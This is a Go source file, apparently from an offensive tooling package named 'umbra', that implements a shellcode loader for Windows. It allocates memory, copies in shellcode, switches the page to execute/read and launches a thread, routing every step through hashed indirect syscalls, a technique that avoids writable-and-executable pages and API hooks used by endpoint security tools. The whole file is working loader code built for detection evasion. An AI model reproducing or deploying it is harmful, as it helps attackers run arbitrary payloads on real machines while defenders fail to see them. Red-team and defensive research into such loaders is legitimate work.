//go:build windows && amd64

package umbra

import (
	"fmt"
	"unsafe"
)

const (
	memCommit       = 0x1000
	memReserve      = 0x2000
	pageReadWrite   = 0x04
	pageExecuteRead = 0x20
	curProcess      = ^uintptr(0) // NtCurrentProcess()
	threadAllAccess = 0x1FFFFF
)

// Run maps shellcode into a fresh region and executes it on a new thread.
//
// The page is committed read/write, filled, then reprotected to execute/read
// before any thread can run it, so a writable-and-executable page never exists
// at any instant. Allocation, the copy and the protection change all go through
// this engine's indirect syscalls. The new thread handle is returned; the caller
// may wait on it or let it run.
func (e *Engine) Run(shellcode []byte) (uintptr, error) {
	if len(shellcode) == 0 {
		return 0, fmt.Errorf("umbra: empty shellcode")
	}

	var base uintptr
	size := uintptr(len(shellcode))
	if _, err := e.Syscall(HashAllocVM, curProcess,
		uintptr(unsafe.Pointer(&base)), 0,
		uintptr(unsafe.Pointer(&size)), memCommit|memReserve, pageReadWrite); err != nil {
		return 0, err
	}

	var written uintptr
	if _, err := e.Syscall(HashWriteVM, curProcess, base,
		uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)),
		uintptr(unsafe.Pointer(&written))); err != nil {
		return 0, err
	}

	rgn := uintptr(len(shellcode))
	var old uintptr
	if _, err := e.Syscall(HashProtectVM, curProcess,
		uintptr(unsafe.Pointer(&base)), uintptr(unsafe.Pointer(&rgn)),
		uintptr(pageExecuteRead), uintptr(unsafe.Pointer(&old))); err != nil {
		return 0, err
	}

	var thread uintptr
	if _, err := e.Syscall(HashCreateThread,
		uintptr(unsafe.Pointer(&thread)), uintptr(threadAllAccess), 0,
		curProcess, base, 0, 0, 0, 0, 0, 0); err != nil {
		return 0, err
	}
	return thread, nil
}
